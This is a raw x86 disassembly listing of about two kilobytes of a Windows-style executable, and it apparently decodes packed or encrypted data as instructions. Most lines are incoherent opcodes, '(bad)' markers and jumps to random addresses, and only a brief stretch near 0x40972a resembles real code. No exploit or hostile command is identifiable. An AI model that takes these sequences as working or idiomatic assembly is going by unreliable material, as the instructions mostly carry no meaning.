  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	(bad)  
  409317:	push   eax
  409318:	pop    ebp
  409319:	xchg   edx,eax
  40931a:	loop   0x40939a
  40931c:	jle    0x40938e
  40931e:	jns    0x40939e
  409320:	jle    0x4092ce
  409322:	ss mov ch,0xa9
  409325:	lods   eax,DWORD PTR ds:[esi]
  409326:	cvtpi2ps xmm1,QWORD PTR [ebx]
  409329:	cmp    ah,ah
  40932b:	dec    ecx
  40932c:	cwde   
  40932d:	(bad)  
  40932e:	es sti 
  409330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409331:	pop    ss
  409332:	(bad)  
  409333:	dec    ebx
  409334:	xchg   ecx,eax
  409335:	lahf   
  409336:	dec    esp
  409337:	mov    DWORD PTR [ecx+0x41],edx
  40933a:	rcr    BYTE PTR [esi],1
  40933c:	sbb    DWORD PTR [esi],edx
  40933e:	fisub  WORD PTR [eax+0x12496fe5]
  409344:	and    ebp,esi
  409346:	cmp    esp,edi
  409348:	sub    eax,0xce15072f
  40934d:	ret    0x4e4
  409350:	pop    esp
  409351:	(bad)  
  409352:	mov    DWORD PTR [esi],edi
  409354:	jg     0x409350
  409356:	mov    ah,0x58
  409358:	xchg   edx,eax
  409359:	ret    
  40935a:	xchg   edi,eax
  40935b:	fnstcw WORD PTR [ecx]
  40935d:	add    eax,0xac60087f
  409362:	int    0x8c
  409364:	(bad)  
  409366:	sbb    BYTE PTR [ecx+ebx*8-0x1f819737],ch
  40936d:	fstp   DWORD PTR [eax+0x48cb6d13]
  409373:	inc    esi
  409374:	in     al,0xb6
  409376:	mov    edi,0x1da7f5dd
  40937b:	test   DWORD PTR [eax-0x23201eb9],0xb39609e0
  409385:	icebp  
  409386:	xchg   esp,eax
  409387:	or     edi,ebx
  409389:	mov    dh,0x5b
  40938b:	or     DWORD PTR [edi+0x665576b],esp
  409391:	xchg   edx,eax
  409392:	rol    BYTE PTR [edi-0x3b],0xa6
  409396:	inc    esp
  409397:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409399:	rcl    DWORD PTR [ecx],cl
  40939b:	adc    bl,bh
  40939d:	ficomp WORD PTR [ebp-0x20c6d2c7]
  4093a3:	mov    ecx,0xfd8d5d3e
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	in     al,dx
  4093aa:	mov    edx,gs
  4093ac:	into   
  4093ad:	inc    esp
  4093ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093af:	test   al,0xe3
  4093b1:	pusha  
  4093b2:	sbb    eax,0xd00c7e04
  4093b7:	push   ecx
  4093b8:	rol    BYTE PTR ds:[ebx+esi*8],0xdd
  4093bd:	mov    dl,0x2e
  4093bf:	fadd   st(5),st
  4093c1:	sub    al,0x8c
  4093c3:	pop    eax
  4093c4:	das    
  4093c5:	into   
  4093c6:	add    esi,DWORD PTR [ebx]
  4093c8:	jmp    0x409377
  4093ca:	pop    es
  4093cb:	push   esp
  4093cc:	ss out dx,eax
  4093ce:	add    eax,0x6e6ad968
  4093d3:	mov    DWORD PTR [ebp+0x61960a2a],ecx
  4093d9:	mov    dl,0x2c
  4093db:	mov    bl,0xea
  4093dd:	pand   mm6,QWORD PTR [edi+0x6f]
  4093e1:	fiadd  DWORD PTR [edx+0x202505ec]
  4093e7:	mov    ds:0xfac56efa,al
  4093ec:	inc    edi
  4093ed:	lods   al,BYTE PTR ds:[esi]
  4093ee:	rcr    DWORD PTR [esi-0x200fe21a],1
  4093f4:	pop    ss
  4093f5:	mov    bl,0xb
  4093f7:	pushf  
  4093f8:	idiv   BYTE PTR [ebx]
  4093fa:	push   edi
  4093fb:	sar    ch,1
  4093fd:	fdiv   DWORD PTR [ecx+0x73]
  409400:	dec    edi
  409401:	and    DWORD PTR [ebp+0x673a74c1],ebp
  409407:	cs mov al,bh
  40940a:	xor    cl,BYTE PTR [eax]
  40940c:	xlat   BYTE PTR ds:[ebx]
  40940d:	int    0x5a
  40940f:	outs   dx,BYTE PTR ds:[esi]
  409410:	xor    al,0xde
  409412:	test   BYTE PTR [eax-0xbd3b2d9],bl
  409418:	mov    ds:0xdb0e86e0,eax
  40941d:	daa    
  40941e:	mov    esp,0xb74ac302
  409423:	ret    0x5290
  409426:	shr    DWORD PTR [edx],0x91
  409429:	xor    BYTE PTR [edi+0x3328ef18],ch
  40942f:	or     eax,0x5050b418
  409434:	jl     0x409488
  409436:	or     al,0xdc
  409438:	loop   0x409476
  40943a:	xor    eax,0xd7e5c109
  40943f:	adc    edi,DWORD PTR [ebx]
  409441:	int3   
  409442:	ds or  al,0x57
  409445:	int    0x3
  409447:	jg     0x4093fb
  409449:	aaa    
  40944a:	mov    ebx,0x5b8c1dea
  40944f:	cs (bad) 
  409451:	(bad)  
  409452:	icebp  
  409453:	cmp    al,0xe3
  409455:	mov    eax,ds:0x5dbf0c6f
  40945a:	mov    es,ecx
  40945c:	xor    al,0xb9
  40945e:	sub    eax,0xa60e1e99
  409463:	and    eax,0x3d19ac
  409468:	test   BYTE PTR [ebx-0xb58d01a],0x83
  40946f:	cld    
  409470:	dec    edi
  409471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409472:	jne    0x4094f3
  409474:	stos   DWORD PTR es:[edi],eax
  409475:	ss push eax
  409477:	ror    ah,cl
  409479:	retf   0xddd4
  40947c:	fstp   DWORD PTR [ecx+eax*1-0x80]
  409480:	mov    esi,DWORD PTR [eax-0x75]
  409483:	lods   al,BYTE PTR ds:[esi]
  409484:	popa   
  409485:	jge    0x4094cd
  409487:	add    al,0xc3
  409489:	rol    DWORD PTR [ebp+0x20e6f7fe],0x3f
  409490:	fdivr  QWORD PTR [ebx+0xd]
  409493:	mov    DWORD PTR [ebp+edx*2-0x7f576058],esi
  40949a:	sub    al,0x2b
  40949c:	(bad)  
  40949d:	ret    
  40949e:	frstor ds:0x6f62b8fb
  4094a4:	inc    edx
  4094a5:	clc    
  4094a6:	sbb    ecx,DWORD PTR [eax+ebp*4+0x77]
  4094aa:	mov    esp,0x8824fe58
  4094af:	es (bad) 
  4094b1:	pop    eax
  4094b2:	or     eax,0x674fcf13
  4094b7:	push   ebp
  4094b8:	mov    bh,0x60
  4094ba:	aas    
  4094bb:	xchg   esp,ebp
  4094bd:	mov    edi,0xee51f5ae
  4094c2:	add    ebp,eax
  4094c4:	or     ch,BYTE PTR [edx-0x24]
  4094c7:	adc    eax,0x288126c1
  4094cc:	jo     0x40952e
  4094ce:	int3   
  4094cf:	ja     0x4094ca
  4094d1:	aaa    
  4094d2:	push   edx
  4094d3:	pop    es
  4094d4:	(bad)
  4094d7:	add    dl,ch
  4094d9:	data16 cmp BYTE PTR [ecx+0x1874fe48],dl
  4094e0:	push   ecx
  4094e1:	or     eax,0x8cae5430
  4094e7:	cmc    
  4094e8:	push   edx
  4094e9:	lahf   
  4094ea:	cwde   
  4094eb:	mov    ecx,0xb230cb46
  4094f0:	repz dec edx
  4094f2:	ins    DWORD PTR es:[edi],dx
  4094f3:	mov    ds:0x6849d7f2,eax
  4094f8:	xor    BYTE PTR [ecx+ebp*8-0x74627653],0xf0
  409500:	xor    edx,edi
  409502:	or     eax,0xb1a6fce1
  409507:	sahf   
  409508:	mov    ecx,0xc7f4888b
  40950d:	mov    ebp,0xf4157a4c
  409512:	jb     0x409523
  409514:	out    dx,eax
  409515:	popf   
  409516:	cmc    
  409517:	jl     0x4094a7
  409519:	mov    DWORD PTR [ecx+0xb253941],eax
  40951f:	cmp    al,0x57
  409521:	cmp    dh,BYTE PTR [esi+0x4]
  409524:	dec    ebx
  409525:	fild   DWORD PTR [ecx+0x61]
  409528:	(bad)  
  40952a:	rol    edi,1
  40952c:	push   edi
  40952d:	sub    al,0xfa
  40952f:	sub    edi,DWORD PTR [esi-0x38]
  409532:	push   esp
  409533:	(bad)  
  409535:	in     al,0x7a
  409537:	retf   0x43df
  40953a:	push   ebx
  40953b:	aad    0x59
  40953d:	jb     0x40952c
  40953f:	mov    esp,DWORD PTR [eax+0x12]
  409542:	dec    esi
  409543:	(bad)  
  409544:	mov    DWORD PTR [edi+0x40],edi
  409547:	mov    bl,bh
  409549:	adc    al,0x72
  40954b:	xor    DWORD PTR [edx+0x39],ebx
  40954e:	or     eax,0x69435b5c
  409553:	rol    DWORD PTR [edx+0x2e7c8ee3],0x9d
  40955a:	jmp    DWORD PTR [edx-0x6]
  40955d:	xchg   ebx,eax
  40955e:	call   0x39ec9674
  409563:	repz pusha 
  409565:	dec    ebx
  409566:	mov    cl,0x99
  409568:	in     al,dx
  409569:	mov    edx,edx
  40956b:	iret   
  40956c:	lahf   
  40956d:	xchg   ebx,eax
  40956e:	and    ch,BYTE PTR [ebp+0x77]
  409571:	push   ds
  409572:	test   al,0x9d
  409574:	fidivr WORD PTR [edi+0xd3bcc10]
  40957a:	add    edx,esi
  40957c:	xor    eax,0x5b47ba21
  409581:	push   cs
  409582:	pop    ebp
  409583:	xor    ebp,DWORD PTR [ebx]
  409585:	inc    ebx
  409586:	fucomp st(1)
  409588:	mov    ch,0x74
  40958a:	ja     0x409532
  40958c:	sub    dh,cl
  40958e:	cmp    bh,bl
  409590:	cmp    al,BYTE PTR [edx+0x259bbb9]
  409596:	(bad)  
  409597:	cmp    ecx,eax
  409599:	call   0xde75:0x80b9c31c
  4095a0:	or     bh,ah
  4095a2:	or     bl,dh
  4095a4:	(bad)  
  4095a5:	aad    0x2e
  4095a7:	fsubr  DWORD PTR [ecx-0x207273ca]
  4095ad:	out    dx,eax
  4095ae:	cs inc esi
  4095b0:	ror    BYTE PTR [edi],cl
  4095b2:	lds    ebp,FWORD PTR [ebp-0x77e5f8b2]
  4095b8:	sbb    cl,0x51
  4095bb:	inc    esi
  4095bc:	fdivrp st(3),st
  4095be:	xor    DWORD PTR [ebx+0x3f10e055],esp
  4095c4:	outs   dx,BYTE PTR ds:[esi]
  4095c5:	pusha  
  4095c6:	in     al,dx
  4095c7:	test   DWORD PTR [edx-0x76],edi
  4095ca:	jl     0x409560
  4095cc:	cli    
  4095cd:	sbb    eax,0x6b74447c
  4095d2:	xor    eax,0xc7416e00
  4095d7:	stos   BYTE PTR es:[edi],al
  4095d8:	iret   
  4095d9:	and    ecx,edi
  4095db:	loop   0x409636
  4095dd:	and    al,0xd1
  4095df:	push   ss
  4095e0:	adc    BYTE PTR [edx-0x6a],ch
  4095e3:	jl     0x4095a2
  4095e5:	sbb    edi,DWORD PTR ds:0xef78f45f
  4095eb:	jl     0x40964c
  4095ed:	dec    ebp
  4095ee:	stc    
  4095ef:	rcr    BYTE PTR [esp+edx*8+0x73],cl
  4095f3:	jbe    0x409580
  4095f5:	jp     0x4095ef
  4095f7:	or     al,0x39
  4095f9:	sahf   
  4095fa:	popf   
  4095fb:	data16 stc 
  4095fd:	adc    eax,0xd12d87ed
  409602:	add    ch,dh
  409604:	imul   eax,DWORD PTR [edx-0x19e69678],0x2e
  40960b:	push   esi
  40960c:	mov    dh,BYTE PTR [esi-0x7d]
  40960f:	jnp    0x409681
  409611:	loopne 0x409680
  409613:	jae    0x409634
  409615:	jmp    0x261a:0x601b0799
  40961c:	mov    ebp,0x3be6db53
  409621:	sbb    cx,0x50ae
  409626:	jo     0x4095d1
  409628:	fsub   DWORD PTR [esp+ebx*4+0x7a893dc8]
  40962f:	sahf   
  409630:	push   esp
  409631:	cmp    dl,ah
  409633:	retf   
  409634:	test   al,0x92
  409636:	popa   
  409637:	jl     0x4095e7
  409639:	stc    
  40963a:	push   ebp
  40963b:	ins    DWORD PTR es:[edi],dx
  40963c:	mov    ah,0xba
  40963e:	clc    
  40963f:	sub    eax,0x30a88baf
  409644:	ss push 0xf1880455
  40964a:	fdivr  DWORD PTR [edx-0x2c]
  40964d:	call   FWORD PTR [ecx+0x5d]
  409650:	in     al,dx
  409651:	sbb    DWORD PTR [ebx+0x784c306e],edx
  409657:	repz xor al,0xf2
  40965a:	data16 lahf 
  40965c:	mov    dh,0x8b
  40965e:	sbb    al,0x61
  409660:	add    dl,ch
  409662:	fisub  WORD PTR [esi+0x10e81d55]
  409668:	(bad)  
  40966a:	xchg   esp,eax
  40966b:	xor    cl,ah
  40966d:	mov    dh,0xfc
  40966f:	or     edx,DWORD PTR [edi-0xeded959]
  409675:	shl    DWORD PTR [edx+0x7bcf3d36],cl
  40967b:	stos   DWORD PTR es:[edi],eax
  40967c:	mov    edx,0xcc70bdb3
  409681:	push   ebp
  409682:	test   BYTE PTR [ebx+0x241f13a2],bl
  409688:	pop    ds
  409689:	nop
  40968a:	sub    eax,0x6597a476
  40968f:	mov    esp,DWORD PTR [edx]
  409691:	div    DWORD PTR [ebx]
  409693:	aam    0xde
  409695:	out    dx,al
  409696:	cmp    al,0x23
  409698:	icebp  
  409699:	add    al,0x77
  40969b:	dec    eax
  40969c:	adc    eax,0x70e83977
  4096a1:	jno    0x4096ff
  4096a3:	repnz adc esi,DWORD PTR [esi+ebp*1-0x7b835279]
  4096ab:	add    bh,cl
  4096ad:	sub    BYTE PTR [ecx-0x41],0x44
  4096b1:	stos   DWORD PTR es:[edi],eax
  4096b2:	xor    edi,DWORD PTR [ebx+0x42]
  4096b5:	xor    DWORD PTR ds:0x3b2b0b53,eax
  4096bb:	sbb    dh,bl
  4096bd:	xchg   edx,eax
  4096be:	(bad)  
  4096bf:	neg    esi
  4096c1:	(bad)  
  4096c2:	and    esi,DWORD PTR [edx]
  4096c4:	jecxz  0x409692
  4096c6:	or     eax,0xc46288f8
  4096cb:	retf   
  4096cc:	sbb    bl,bl
  4096ce:	loop   0x4096ea
  4096d0:	es sub eax,0x97ee8b54
  4096d6:	jle    0x40966f
  4096d8:	and    al,0x10
  4096da:	dec    eax
  4096db:	jno    0x4096bf
  4096dd:	mov    cl,BYTE PTR [ecx]
  4096df:	adc    bh,dl
  4096e1:	xchg   DWORD PTR [ebp+0x7ceb3fd9],ebp
  4096e7:	int3   
  4096e8:	inc    ecx
  4096e9:	hlt    
  4096ea:	loop   0x40972f
  4096ec:	mov    edx,0x5ca8b4cb
  4096f1:	xchg   ebx,eax
  4096f2:	mov    eax,ds:0x181d8618
  4096f7:	jp     0x40976e
  4096f9:	call   0xdac245f7
  4096fe:	push   esp
  4096ff:	add    DWORD PTR [esi+0x20],0x7
  409703:	fidiv  WORD PTR [esi+0x50]
  409706:	and    edx,DWORD PTR [esi+0x46]
  409709:	stos   DWORD PTR es:[edi],eax
  40970a:	js     0x409780
  40970c:	cdq    
  40970d:	scas   al,BYTE PTR es:[edi]
  40970e:	sbb    al,0x44
  409710:	out    0x60,eax
  409712:	adc    al,0x23
  409714:	iret   
  409715:	adc    al,0xe
  409717:	cmp    DWORD PTR [edi+0x458b72bf],esp
  40971d:	or     BYTE PTR [ebx+0x43460f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434613
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4344f3
  409745:	add    ecx,DWORD PTR ds:0x434537
  40974b:	mov    DWORD PTR ds:0x4344f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	loop   0x4097c0
  409767:	mov    edi,0x7eee943a
  40976c:	jle    0x4097de
  40976e:	jns    0x4097ee
  409770:	jle    0x409716
  409772:	pop    esi
  409773:	push   edx
  409774:	jmp    0x409789
  409776:	and    eax,eax
  409778:	xchg   DWORD PTR [edi+0x3c],edi
  40977b:	pop    ebp
  40977c:	jmp    0xf61:0x8136eadb
  409783:	add    BYTE PTR [ecx],cl
  409785:	scas   eax,DWORD PTR es:[edi]
  409786:	(bad)  
  409787:	out    dx,al
  409788:	and    ebp,esp
  40978a:	(bad)  
  40978b:	icebp  
  40978c:	in     al,dx
  40978d:	push   es
  40978e:	xchg   DWORD PTR [ebx],eax
  409790:	sbb    edi,DWORD PTR [eax+ecx*8+0x32]
  409794:	es scas al,BYTE PTR es:[edi]
  409796:	lods   al,BYTE PTR ds:[esi]
  409797:	jle    0x409762
  409799:	jb     0x40977d
  40979b:	xor    edi,esp
  40979d:	dec    edi
  40979e:	lea    esi,[ecx-0x44]
  4097a1:	iret   
  4097a2:	ins    BYTE PTR es:[edi],dx
  4097a3:	jns    0x40978f
  4097a5:	call   FWORD PTR [eax]
  4097a7:	mov    ch,0x4c
  4097a9:	pushf  
  4097aa:	pusha  
  4097ab:	arpl   WORD PTR [eax+ebp*1],di
  4097ae:	cdq    
  4097af:	inc    eax
  4097b0:	jecxz  0x40980d
  4097b2:	dec    edi
  4097b3:	repz cmp dl,BYTE PTR [esp+ebp*8]
  4097b7:	dec    esp
  4097b8:	jae    0x4097cd
  4097ba:	sbb    esi,DWORD PTR [esi]
  4097bc:	inc    edi
  4097bd:	hlt    
  4097be:	sbb    eax,0x5c534782
  4097c3:	or     BYTE PTR [edi+0x34d5707e],dh
  4097c9:	je     0x409799
  4097cb:	xchg   ecx,eax
  4097cc:	(bad)  
  4097cd:	loop   0x40977b
  4097cf:	inc    ecx
  4097d0:	fwait
  4097d1:	addr16 pop esi
  4097d3:	iret   
  4097d4:	ins    BYTE PTR es:[edi],dx
  4097d5:	add    eax,DWORD PTR [eax-0x4e]
  4097d8:	ja     0x4097f8
  4097da:	xchg   ecx,ebx
  4097dc:	or     dh,BYTE PTR [ebp-0x3c]
  4097df:	xor    bh,BYTE PTR ds:0x9ef8dd0c
  4097e5:	mov    edx,0x5f4f96e3
  4097ea:	retf   0x8d40
  4097ed:	mov    bl,BYTE PTR [esi+0x790b995]
  4097f3:	push   eax
  4097f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097f5:	sbb    ebp,DWORD PTR [ecx-0x5106d581]
  4097fb:	jne    0x4097ab
  4097fd:	(bad)  
  4097fe:	aad    0xd7
  409800:	cmp    edi,DWORD PTR [ebx+esi*1+0x0]
  409804:	sbb    edi,DWORD PTR [esi-0x1a]
  409807:	push   esp
  409808:	jnp    0x4097b8
  40980a:	mov    ebp,0xb395f2c
  40980f:	mov    dl,0x17
  409811:	or     ecx,DWORD PTR [edi+0x71]
  409814:	xchg   ecx,eax
  409815:	js     0x409805
  409817:	sub    ch,BYTE PTR [esi-0x7dc4123]
  40981d:	jnp    0x4097ac
  40981f:	push   ds
  409820:	or     al,0x4a
  409822:	addr16 sti 
  409824:	cmp    al,ah
  409826:	lahf   
  409827:	pop    edx
  409828:	xchg   ecx,eax
  409829:	mov    ch,0x16
  40982b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40982c:	mul    BYTE PTR [edi]
  40982e:	add    DWORD PTR [esi-0x1c],0xffffffad
  409832:	sub    DWORD PTR [esi-0x7d7ebb0c],ecx
  409838:	pusha  
  409839:	jne    0x4098ad
  40983b:	mov    bh,0x1c
  40983d:	push   eax
  40983e:	cmp    al,0xe3
  409840:	push   DWORD PTR [esi*4+0x3dbe4087]
  409847:	add    al,0x9
  409849:	ret    
  40984a:	or     ah,dh
  40984c:	or     eax,0x5992273
  409851:	or     al,0x5f
  409853:	mov    eax,0x46ad2279
  409858:	inc    ebp
  409859:	loop   0x4098d0
  40985b:	xchg   esi,eax
  40985c:	hlt    
  40985d:	int3   
  40985e:	add    ebx,ebp
  409860:	pop    ebp
  409861:	sub    bh,cl
  409863:	clc    
  409864:	pop    eax
  409865:	ja     0x4098d2
  409867:	push   edi
  409868:	fwait
  409869:	xor    al,0xb0
  40986b:	jnp    0x4098e5
  40986d:	out    dx,al
  40986e:	bound  ebp,QWORD PTR [edi+0x4a]
  409871:	out    dx,eax
  409872:	lods   eax,DWORD PTR ds:[esi]
  409873:	mov    edx,0xafb82034
  409878:	mov    esi,0xa945b6b9
  40987d:	adc    bl,0xee
  409880:	int    0xdc
  409882:	retf   0x1bad
  409885:	daa    
  409886:	pop    esi
  409887:	cdq    
  409888:	mov    ds:0x26517eb3,eax
  40988d:	mov    ds:0x94af2859,eax
  409892:	add    BYTE PTR [edx-0x3de56257],cl
  409898:	mov    esp,0xef72296e
  40989d:	sub    cl,ch
  40989f:	cmp    edi,DWORD PTR [edi]
  4098a1:	(bad)  
  4098a2:	lahf   
  4098a3:	stc    
  4098a4:	lods   al,BYTE PTR ds:[esi]
  4098a5:	sbb    esp,edi
  4098a7:	retf   
  4098a8:	jg     0x40984d
  4098aa:	lock sub ch,bh
  4098ad:	or     al,0xd3
  4098af:	adc    eax,0x91c36ea6
  4098b4:	pop    esi
  4098b5:	ret    0xeeb2
  4098b8:	idiv   BYTE PTR [ecx+0x432c9bcd]
  4098be:	and    edi,DWORD PTR [esi]
  4098c0:	cli    
  4098c1:	push   edx
  4098c2:	cmp    dl,BYTE PTR [eax+edi*1+0x5600c150]
  4098c9:	shr    BYTE PTR [ebx+0x57d3705a],0xa3
  4098d0:	and    BYTE PTR [eax-0x8ad3786],0x4
  4098d7:	fistp  WORD PTR ds:0xdbc44987
  4098dd:	xchg   esp,eax
  4098de:	add    al,0xae
  4098e0:	xor    eax,0x7c1842f1
  4098e5:	pop    es
  4098e6:	or     al,0x6
  4098e8:	mov    ah,0x5f
  4098ea:	sub    ah,BYTE PTR [ebx-0x12]
  4098ed:	ret    0xddf7
  4098f0:	or     eax,0xde8b7150
  4098f5:	inc    edx
  4098f6:	pop    ds
  4098f7:	test   DWORD PTR [ebx-0x7826b4db],edi
  4098fd:	enter  0x151b,0xce
  409901:	mov    ebx,DWORD PTR [edx]
  409903:	add    eax,0x2f849c82
  409908:	retf   0x919d
  40990b:	mov    ebx,0x7b74d549
  409910:	pop    edx
  409911:	cmove  esp,DWORD PTR [edx-0x6573b0fc]
  409918:	or     ch,BYTE PTR [ecx*2+0x1a139eb2]
  40991f:	sbb    ebp,DWORD PTR [esp+eax*8-0x2d]
  409923:	xchg   ecx,eax
  409924:	and    BYTE PTR [edx+0x43],bh
  409927:	gs jmp edi
  40992a:	cmc    
  40992b:	shl    BYTE PTR [ecx],1
  40992d:	pop    ebx
  40992e:	(bad)  
  40992f:	pop    esi
  409930:	jge    0x4098e7
  409932:	dec    ebp
  409933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409934:	test   BYTE PTR [ebp-0x5f789d35],cl
  40993a:	and    DWORD PTR [ebp+0xc26fc9a],ebx
  409940:	(bad)  
  409941:	pop    esp
  409942:	mov    ecx,0x46dadfb8
  409947:	mov    ch,0x80
  409949:	jg     0x409914
  40994b:	cs sahf 
  40994d:	xor    edi,edi
  40994f:	and    eax,0xd4034fd8
  409954:	sub    esi,eax
  409956:	mov    edi,0xfae3f3c2
  40995b:	push   es
  40995c:	xchg   ebp,eax
  40995d:	dec    eax
  40995e:	and    ah,ch
  409960:	aad    0xaf
  409962:	or     DWORD PTR [eax-0x1f097be1],esp
  409968:	repz lahf 
  40996a:	or     al,0x9
  40996c:	out    0xa4,eax
  40996e:	or     BYTE PTR ds:0xd585152b,dl
  409974:	mov    dh,al
  409976:	push   cs
  409977:	push   eax
  409978:	adc    eax,0xc5af42e1
  40997d:	inc    esp
  40997e:	adc    al,0x9e
  409980:	lods   al,BYTE PTR ds:[esi]
  409981:	mov    edi,0x7c4503da
  409986:	in     al,dx
  409987:	and    bh,dl
  409989:	enter  0xf0d1,0xb4
  40998d:	cs dec edx
  40998f:	(bad)  
  409990:	dec    ebx
  409991:	inc    esi
  409992:	vcvtsi2ss xmm0,xmm0,ebx
  409996:	adc    al,0xa0
  409998:	(bad)  
  409999:	push   cs
  40999a:	(bad)  
  40999b:	mov    ebp,0xf383a756
  4099a0:	mov    dl,0x38
  4099a2:	es ret 
  4099a4:	imul   edx
  4099a6:	scas   al,BYTE PTR es:[edi]
  4099a7:	cwde   
  4099a8:	mov    ch,ah
  4099aa:	pushf  
  4099ab:	std    
  4099ac:	fnstenv [eax]
  4099ae:	and    BYTE PTR [esi],bl
  4099b0:	mov    esp,0xfdea0d8a
  4099b5:	cmp    DWORD PTR [edi-0x5c],0x1b
  4099b9:	xor    DWORD PTR [edi+edi*1-0x40],ebx
  4099bd:	je     0x4099cb
  4099bf:	idiv   DWORD PTR [ebx]
  4099c1:	mov    ds:0x3af71811,eax
  4099c6:	loope  0x409a09
  4099c8:	repz std 
  4099ca:	xchg   ebp,eax
  4099cb:	or     eax,0x77fe1ea7
  4099d0:	sbb    al,BYTE PTR [ecx-0x5a]
  4099d3:	pop    edi
  4099d4:	outs   dx,BYTE PTR ds:[esi]
  4099d5:	dec    esp
  4099d6:	pop    ecx
  4099d7:	mov    esi,0x633bb500
  4099dc:	loopne 0x409a08
  4099de:	mov    eax,0xa0b267fb
  4099e3:	loope  0x40996b
  4099e5:	mov    eax,0x5114af8
  4099ea:	rol    DWORD PTR [ecx],0x2e
  4099ed:	inc    esp
  4099ee:	jmp    0x409a36
  4099f0:	lods   al,BYTE PTR ds:[esi]
  4099f1:	xchg   ebp,eax
  4099f2:	sahf   
  4099f3:	(bad)  
  4099f4:	aam    0x1
  4099f6:	mov    ss,WORD PTR [eax+0x3a]
  4099f9:	mov    al,ds:0xd58bf507
  4099fe:	ss mov dl,0xf4
  409a01:	xchg   ebx,eax
  409a02:	shl    BYTE PTR [edx+0x4c],0x95
  409a06:	es test BYTE PTR ds:[edx+0x2c461b56],cl
  409a0e:	xor    DWORD PTR [ebx+eiz*2-0x59],edi
  409a12:	mov    esi,fs
  409a14:	dec    edi
  409a15:	sbb    eax,0x1c4817f9
  409a1a:	sub    DWORD PTR ds:0x43dc1328,0xfffffff6
  409a21:	cmp    DWORD PTR [ebx+0x4e99a192],ecx
  409a27:	or     eax,0x1f057236
  409a2c:	mov    ebp,0x537a7086
  409a31:	mov    eax,ds:0x13bacd18
  409a36:	je     0x409a38
  409a38:	call   0x8d02:0x5f982cc5
  409a3f:	adc    ebx,esp
  409a41:	push   edi
  409a42:	lea    ebp,[ebp-0x190ae4dc]
  409a48:	pusha  
  409a49:	mov    ebx,ecx
  409a4b:	ficomp DWORD PTR [edx-0x34]
  409a4e:	push   edx
  409a4f:	pushf  
  409a50:	rol    BYTE PTR [eax+0x4cc3ddb6],1
  409a56:	call   0x85a2ef36
  409a5b:	aas    
  409a5c:	sbb    DWORD PTR [ecx+ebp*1+0x47d7c6f6],edi
  409a63:	mul    ah
  409a65:	fxch   st(4)
  409a67:	sahf   
  409a68:	mov    esp,0x9fa96bbd
  409a6d:	cmp    bh,BYTE PTR [ecx-0x61c75e60]
  409a73:	pop    esi
  409a74:	xchg   ecx,eax
  409a75:	xor    esp,DWORD PTR [edx]
  409a77:	lods   eax,DWORD PTR ds:[esi]
  409a78:	leave  
  409a79:	cmp    al,0x6d
  409a7b:	dec    ebp
  409a7c:	xor    al,0xae
  409a7e:	jne    0x409abf
  409a80:	js     0x409a6a
  409a82:	sub    al,0x11
  409a84:	fild   WORD PTR [edi+eiz*8]
  409a87:	sub    bl,ch
  409a89:	stc    
  409a8a:	sbb    DWORD PTR [eax],ebp
  409a8c:	sbb    BYTE PTR [ecx-0x65407f3e],0xff
  409a93:	test   BYTE PTR [ebp-0x25],0x51
  409a97:	xchg   ebx,eax
  409a98:	cmp    ebp,esp
  409a9a:	sbb    bh,bl
  409a9c:	fild   QWORD PTR [ecx+0x38]
  409a9f:	mov    di,0x603a
  409aa3:	in     al,0xcd
  409aa5:	jne    0x409ab0
  409aa7:	cdq    
  409aa8:	cmp    al,0xc3
  409aaa:	ja     0x409ad9
  409aac:	scas   eax,DWORD PTR es:[edi]
  409aad:	add    DWORD PTR [esi+0x1f6002da],eax
  409ab3:	jg     0x409a8b
  409ab5:	push   ds
  409ab6:	push   ecx
  409ab7:	pop    ds
  409ab8:	and    al,0xee
  409aba:	sar    ebp,1
  409abc:	scas   eax,DWORD PTR es:[edi]
  409abd:	loopne 0x409b3a
  409abf:	popf   
  409ac0:	gs adc eax,0xbebafe0d
  409ac6:	add    BYTE PTR [eax],al
  409ac8:	jl     0x409a83
  409aca:	sbb    eax,0x6533dd12
  409acf:	dec    ecx
  409ad0:	mov    ds:0xdc520cb,al
  409ad5:	sub    DWORD PTR [ebx-0x439ac7a4],esi
  409adb:	es imul esp,edi,0xbfa2a67c
  409ae2:	pop    edx
  409ae3:	sbb    ecx,DWORD PTR [eax+0x4db8ff5]
  409ae9:	dec    ebp
  409aea:	dec    eax
  409aeb:	xchg   esp,ecx
  409aed:	or     eax,0x6ebbe606
  409af2:	cmp    esp,DWORD PTR [ebp+0x6d]
  409af5:	mov    ch,0x4e
  409af7:	(bad)  [eax]
  409af9:	rcr    DWORD PTR [eax+0x3b3ea74a],1
  409aff:	fist   WORD PTR [edx]
  409b01:	das    
  409b02:	add    DWORD PTR [esi+esi*2+0xe],esi
  409b06:	add    ebx,eax
  409b08:	cmp    bl,BYTE PTR [ecx-0x23]
  409b0b:	and    eax,0x22894f9b
  409b10:	push   edi
  409b11:	mov    ds:0xcda9c1ec,al
  409b16:	ror    al,1
  409b18:	or     eax,0x9f52d5e
  409b1d:	push   eax
  409b1e:	pop    edi
  409b1f:	jnp    0x409b4a
  409b21:	aaa    
  409b22:	and    DWORD PTR [ebp+0x2033abff],esi
  409b28:	fisubr WORD PTR [edx]
  409b2a:	neg    bl
  409b2c:	xor    ah,BYTE PTR [ebp+0x76]
  409b2f:	inc    ebp
  409b30:	aas    
  409b31:	push   esi
  409b32:	and    DWORD PTR [edx-0x143917b7],ebp
  409b38:	cli    
